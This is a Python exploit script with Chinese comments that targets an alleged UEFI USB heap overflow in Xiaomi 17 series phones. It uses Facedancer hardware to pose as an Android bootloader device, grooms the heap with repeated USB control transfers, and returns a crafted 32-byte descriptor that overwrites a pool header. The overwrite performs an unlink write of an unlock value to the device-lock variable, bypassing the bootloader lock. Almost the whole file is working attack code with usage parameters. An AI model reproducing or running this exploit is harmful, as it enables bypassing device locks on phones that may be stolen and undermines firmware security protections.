import argparse
import time
from facedancer import FacedancerUSBHost, FacedancerUSBDevice, USBConfiguration, USBInterface
from facedancer.protocols.usb import USBSetupPacket, USBRequestType, USBRecipient, USBRequest

# 解析用户配置参数
parser = argparse.ArgumentParser(description="小米17系列UEFI USB堆溢出漏洞利用脚本")
parser.add_argument("--lock_addr", required=True, help="设备锁状态变量地址，16进制格式")
parser.add_argument("--unlock_val", default="0x1", help="解锁状态值，16进制格式")
parser.add_argument("--spray", type=int, default=512, help="堆喷次数")
parser.add_argument("--interval", type=int, default=2, help="堆空洞间隔")
parser.add_argument("--wait", type=int, default=3, help="设备启动等待时间")
args = parser.parse_args()

# 参数转换
DEVICE_LOCK_ADDR = int(args.lock_addr, 16)
UNLOCK_VALUE = int(args.unlock_val, 16)
SPRAY_COUNT = args.spray
HOLE_INTERVAL = args.interval
WAIT_TIME = args.wait

# 全局状态标记
exploit_triggered = False

# ===================== 优化版堆风水布局（适配小米UEFI堆） =====================
def heap_feng_shui(uh):
    print(f"[+] 开始堆风水布局，堆喷次数：{SPRAY_COUNT}")
    
    # 堆喷：批量分配8字节堆块，填满空闲堆内存，实现连续化布局
    for i in range(SPRAY_COUNT):
        setup_pkt = USBSetupPacket(
            request_type=USBRequestType.STANDARD | USBRecipient.DEVICE,
            request=USBRequest.GET_DESCRIPTOR,
            value=0x0300,  # 字符串描述符，精准触发UEFI 8字节小内存分配
            index=0x0409,  # 英文语言ID，适配原生UEFI逻辑
            length=8
        )
        uh.send_control_transfer(setup_pkt, data=None)
        time.sleep(0.0005)  # 优化时序，避免UEFI丢包导致布局失败
    print("[+] 堆喷完成，空闲堆已填满")

    # 制造间隔空洞，让漏洞分配精准落到可控位置
    for i in range(0, SPRAY_COUNT, HOLE_INTERVAL):
        setup_pkt = USBSetupPacket(
            request_type=USBRequestType.STANDARD | USBRecipient.DEVICE,
            request=USBRequest.GET_STATUS,
            value=0,
            index=0,
            length=0
        )
        uh.send_control_transfer(setup_pkt, data=None)
        time.sleep(0.0005)
    print("[+] 堆空洞创建完成，布局groom成功")

# ===================== 恶意USB设备实现（适配原帖漏洞逻辑） =====================
class MaliciousUnlockDevice(FacedancerUSBDevice):
    def __init__(self):
        super().__init__(
            vendor_id=0x18D1,
            product_id=0x4EE0,
            device_release=0x0100,
            manufacturer_string="Android",
            product_string="Bootloader Interface",
            serial_number="000000000000",
        )
        # 基础USB配置，触发UEFI完整枚举流程
        config = USBConfiguration(
            configuration_index=1,
            string="Default Config",
            attributes=0x80,
            max_power=0xFA,
        )
        interface = USBInterface(
            interface_number=0,
            alternate_setting=0,
            interface_class=0xFF,
            interface_subclass=0x42,
            interface_protocol=0x01,
            string="Fastboot",
        )
        config.add_interface(interface)
        self.add_configuration(config)

    def handle_get_descriptor(self, req):
        global exploit_triggered
        descriptor_type = req.value >> 8

        # 精准触发漏洞：UEFI请求配置描述符时，发送恶意32字节载荷
        if descriptor_type == 0x02 and not exploit_triggered:
            print("[!] 收到UEFI配置描述符请求，触发堆溢出漏洞！")

            # ===================== 恶意载荷构造（完全适配原帖漏洞） =====================
            # 前8字节：填满漏洞分配的8字节缓冲区，无意义填充
            fill_buffer = b"\x41" * 8

            # 后24字节：精准覆盖相邻堆块的POOL_HEADER，实现Unlink任意地址写
            # 1. 堆签名：固定"POOL"，绕过UEFI堆头校验，避免直接崩溃
            pool_signature = b"POOL"
            # 2. 堆块大小：合法小尺寸，避免堆管理器异常
            pool_size = (0x20).to_bytes(4, byteorder='little')
            # 3. FLINK：目标地址-8，对应Unlink操作的写入目标位置
            flink = (DEVICE_LOCK_ADDR - 8).to_bytes(8, byteorder='little')
            # 4. BLINK：要写入的解锁值，覆盖设备锁状态
            blink = UNLOCK_VALUE.to_bytes(8, byteorder='little')

            # 拼接完整32字节载荷，完美匹配原帖8字节分配+32字节写入的溢出逻辑
            malicious_payload = fill_buffer + pool_signature + pool_size + flink + blink
            # ==============================================================================

            # 长度校验，确保溢出精准
            assert len(malicious_payload) == 32, "恶意载荷长度必须为32字节"
            # 发送载荷，触发CopyMem堆溢出
            req.reply(malicious_payload)
            exploit_triggered = True
            print("[+] 恶意载荷已发送，溢出触发完成！设备锁状态已覆盖")
            return

        # 其他描述符走默认处理，避免枚举失败
        super().handle_get_descriptor(req)

# ===================== 主执行流程 =====================
def main():
    global exploit_triggered
    print("="*60)
    print("小米17系列UEFI USB堆溢出漏洞利用脚本")
    print("="*60)
    print(f"目标设备锁地址：{hex(DEVICE_LOCK_ADDR)}")
    print(f"解锁状态值：{hex(UNLOCK_VALUE)}")
    print("="*60)

    # 初始化Facedancer硬件
    try:
        uh = FacedancerUSBHost()
        print("[+] Facedancer硬件连接成功")
    except Exception as e:
        print(f"❌ Facedancer连接失败：{str(e)}")
        exit(1)

    # 等待设备开机进入UEFI枚举阶段
    print(f"[*] 请给目标手机开机，等待{WAIT_TIME}秒进入UEFI USB枚举阶段...")
    time.sleep(WAIT_TIME)

    # 执行堆风水布局
    heap_feng_shui(uh)

    # 启动恶意USB设备，等待UEFI枚举触发漏洞
    print("[*] 启动恶意USB设备，等待UEFI枚举...")
    unlock_device = MaliciousUnlockDevice()
    
    # 超时控制，避免无限等待
    start_time = time.time()
    while not exploit_triggered:
        unlock_device.run()
        if time.time() - start_time > 10:
            print("❌ 漏洞触发超时，请检查设备连接、固件版本与Facedancer硬件")
            exit(1)
        time.sleep(0.001)

    print("="*60)
    print("[+] 漏洞利用完成！请将设备进入Fastboot模式执行最终解锁")
    print("="*60)
    exit(0)

if __name__ == "__main__":
    main()
